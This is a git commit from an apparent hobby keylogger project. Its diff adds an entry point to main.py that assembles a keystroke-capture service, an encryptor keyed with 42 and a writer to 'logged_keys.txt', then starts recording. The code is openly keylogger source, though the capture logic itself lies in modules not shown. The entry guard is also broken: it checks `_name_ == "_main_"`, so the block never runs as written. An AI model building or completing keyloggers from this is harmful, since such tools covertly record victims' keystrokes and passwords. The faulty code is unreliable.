b13367c3fdfa7c977c8ad6361c5c11709d6c5df3
moshik <moshik0527669169@gmail.com>
2025-02-20 16:18:08 +0200

    and creates all the objects, prints a message, and starts recording keys and saving them to a file in encrypted form

--- main.py
+++ main.py
@@ -3,3 +3,14 @@ from fileWriter import FileWriter
 from encryptor import Encryptor
 from keyloggerManager import KeyLoggerManager
 import time
+
+
+if _name_ == "_main_":
+    keylogger = KeyLoggerService()
+    writer = FileWriter("logged_keys.txt")
+    encryptor = Encryptor(42)
+    manager = KeyLoggerManager(keylogger, writer, encryptor)
+
+    print("Keylogger is running... Press Ctrl+C to stop.")
+    manager.start()
+
